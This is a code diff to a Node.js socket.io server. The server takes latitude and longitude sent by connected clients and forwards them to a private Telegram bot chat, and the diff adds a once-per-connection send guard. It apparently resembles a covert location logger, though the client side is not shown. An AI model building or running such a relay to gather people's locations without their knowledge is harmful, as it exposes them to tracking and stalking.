@@ -10,7 +10,7 @@ const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 function sendTelegram(message) {
-    if (!BOT_TOKEN || !CHAT_ID) return; // Safety check
+    if (!BOT_TOKEN || !CHAT_ID) return;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
     https.get(url, (res) => {}).on('error', (e) => { });
 }
@@ -20,7 +20,10 @@ app.get('/', (req, res) => {
 });
 
 io.on('connection', (socket) => {
+    let hasSent = false;
     socket.on('send-location', (data) => {
+        if (hasSent) return;
+        
         const latRef = data.lat >= 0 ? "N" : "S";
         const lngRef = data.lng >= 0 ? "E" : "W";
         const formattedLat = Math.abs(data.lat).toFixed(3);
@@ -28,13 +31,14 @@ io.on('connection', (socket) => {
         
         const telegramMsg = `<b>Acuret LOCATION: ${formattedLat}°${latRef} ${formattedLng}°${lngRef}</b>`;
         sendTelegram(telegramMsg);
+        hasSent = true;
     });
 });
 
 const PORT = process.env.PORT || 3000;
-// Railway hamesha 0.0.0.0 par listen karne ko kehta hai
+// Railway fixed IP address logic
 http.listen(PORT, '0.0.0.0', () => {
     sendTelegram("<b>Acuret•LOCATION\"🌍\"</b>");
-    // Railway logs ke liye clear screen hata diya hai taaki crash na ho
-    console.log(`Server active on port ${PORT}`); 
+    // Railway needs this log to know it's alive!
+    console.log(`Server started on port: ${PORT}`);
 });
